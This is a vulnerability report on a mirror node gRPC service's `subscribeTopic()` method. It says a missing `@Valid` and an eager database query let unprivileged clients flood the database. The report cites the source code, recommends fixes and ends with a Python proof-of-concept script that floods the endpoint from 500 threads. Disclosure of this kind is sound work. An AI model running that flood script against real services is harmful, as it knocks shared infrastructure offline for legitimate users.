### Title
Missing `@Valid` on `subscribeTopic()` Parameter Allows Unbounded Past-EndTime Subscription Flooding to Exhaust DB Resources

### Summary
The `subscribeTopic()` method in `TopicMessageServiceImpl` lacks a `@Valid` annotation on its `filter` parameter, meaning the `@AssertTrue isValidEndTime()` constraint in `TopicMessageFilter` is never enforced by Spring's method validation. An unprivileged attacker can submit filters where `endTime` is in the past (even `endTime < startTime`), causing `TopicContext.isComplete()` to return `true` immediately — but not before `topicMessageRetriever.retrieve(filter, true)` is called unconditionally, issuing a real database query per subscription. With no rate limiting or concurrent-subscriber cap, high-rate repetition can exhaust DB connection pools and degrade service across nodes.

### Finding Description

**Validation bypass — missing `@Valid`:**

`TopicMessageServiceImpl` is annotated `@Validated` at the class level, which enables Spring AOP method validation. However, the `filter` parameter in `subscribeTopic()` carries no `@Valid` annotation:

```java
// TopicMessageServiceImpl.java line 59
public Flux<TopicMessage> subscribeTopic(TopicMessageFilter filter) {
```

Without `@Valid`, Spring does not cascade into `TopicMessageFilter`'s bean constraints. The `@AssertTrue isValidEndTime()` at `TopicMessageFilter.java` lines 43–46 is therefore **never invoked**:

```java
@AssertTrue(message = "End time must be after start time")
public boolean isValidEndTime() {
    return endTime == null || endTime > startTime;
}
```

**Unconditional DB query before completion check:**

Inside `subscribeTopic()`, the historical retrieval is set up before any `isComplete()` guard:

```java
// TopicMessageServiceImpl.java lines 63–64
Flux<TopicMessage> historical = topicMessageRetriever.retrieve(filter, true);
Flux<TopicMessage> live = Flux.defer(() -> incomingMessages(topicContext));
```

`retrieve(filter, true)` is **not deferred** — it executes immediately upon subscription assembly.

**`isComplete()` returns `true` immediately for past `endTime`:**

`TopicContext.startTime` is set to `DomainUtils.now()` at construction (line 194). The completion check at lines 208–209 is:

```java
if (filter.getEndTime() < startTime) {
    return true;
}
```

Any `endTime` value less than the moment the context is created causes immediate completion. Because `retrieve()` is already called unconditionally, the DB query fires regardless.

**No subscriber limit or rate limiting exists.** `subscriberCount` (line 48) is a metric gauge only — it is never checked against a maximum before accepting a new subscription.

**Exploit flow:**

1. Attacker opens a gRPC streaming call to `subscribeTopic` with `startTime = T_past` and `endTime = T_past - 1` (or any value < current wall clock).
2. Spring skips `isValidEndTime()` (no `@Valid`); the filter is accepted.
3. `TopicContext` is constructed; `startTime = now()`.
4. `topicMessageRetriever.retrieve(filter, true)` fires a DB query for the past range.
5. `isComplete()` returns `true`; the live/safety-check fluxes short-circuit.
6. Subscription tears down quickly, but the DB query already ran.
7. Attacker repeats at high rate (e.g., thousands of requests/second from multiple clients).

### Impact Explanation

Each malformed subscription issues at least one synchronous DB query against the mirror node's PostgreSQL backend. With a wide historical range (e.g., `startTime = epoch`, `endTime = now - 1ns`), the query can scan large index ranges. Sustained flooding exhausts the DB connection pool (typically 10–50 connections), causing legitimate subscribers to queue or fail. Because the gRPC service is stateless and horizontally scaled, the DB is a shared bottleneck: saturating it degrades all nodes simultaneously. This aligns with the ≥30% node degradation threshold without requiring any brute-force cryptographic action.

### Likelihood Explanation

The attack requires zero privileges — the gRPC `subscribeTopic` endpoint is publicly accessible to any network client. The attacker needs only a standard gRPC client library and knowledge of a valid `topicId` (topic IDs are public on-chain). The exploit is trivially scriptable, repeatable, and requires no special hardware. The missing `@Valid` annotation is a single-line omission that has likely existed since the validation constraints were added.

### Recommendation

1. **Add `@Valid` to the `filter` parameter** in `subscribeTopic()` to enforce all `TopicMessageFilter` constraints including `isValidEndTime()`:
   ```java
   public Flux<TopicMessage> subscribeTopic(@Valid TopicMessageFilter filter) {
   ```
2. **Guard the historical retrieval** with an early `isComplete()` check before calling `topicMessageRetriever.retrieve()`, or use `Flux.defer()` so it only executes when actually subscribed and after completion is confirmed false.
3. **Enforce a maximum concurrent subscriber limit** by checking `subscriberCount` against a configurable cap before accepting new subscriptions, returning a gRPC `RESOURCE_EXHAUSTED` status when exceeded.
4. **Add per-IP or per-client rate limiting** at the gRPC interceptor layer.

### Proof of Concept

```python
import grpc
# Pseudocode using Hedera mirror node gRPC proto
channel = grpc.insecure_channel("mirror-node-host:5600")
stub = ConsensusServiceStub(channel)

# endTime (1) < startTime (1000) — bypasses isValidEndTime due to missing @Valid
# endTime < now() — causes isComplete() to return true immediately
# But DB query still fires unconditionally

import threading, time

def flood():
    while True:
        try:
            req = ConsensusTopicQuery(
                topic_id=TopicID(topic_num=1),
                consensus_start_time=Timestamp(seconds=1000),  # past
                consensus_end_time=Timestamp(seconds=1),       # before startTime, past
            )
            list(stub.subscribeTopic(req))  # completes immediately, DB query fired
        except:
            pass

# Launch 500 concurrent threads
for _ in range(500):
    threading.Thread(target=flood, daemon=True).start()

time.sleep(60)  # 60 seconds of sustained DB query flooding
```

Each iteration issues one DB query and terminates in milliseconds. At 500 concurrent threads, this generates thousands of DB queries per second, exhausting connection pools and degrading all mirror node instances sharing the same database. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4)

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L40-41)
```java
@Validated
public class TopicMessageServiceImpl implements TopicMessageService {
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L48-48)
```java
    private final AtomicLong subscriberCount = new AtomicLong(0L);
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L59-63)
```java
    public Flux<TopicMessage> subscribeTopic(TopicMessageFilter filter) {
        log.info("Subscribing to topic: {}", filter);
        TopicContext topicContext = new TopicContext(filter);

        Flux<TopicMessage> historical = topicMessageRetriever.retrieve(filter, true);
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L203-215)
```java
        boolean isComplete() {
            if (filter.getEndTime() == null) {
                return false;
            }

            if (filter.getEndTime() < startTime) {
                return true;
            }

            return Instant.ofEpochSecond(0, filter.getEndTime())
                    .plus(grpcProperties.getEndTimeInterval())
                    .isBefore(Instant.now());
        }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/domain/TopicMessageFilter.java (L43-46)
```java
    @AssertTrue(message = "End time must be after start time")
    public boolean isValidEndTime() {
        return endTime == null || endTime > startTime;
    }
```
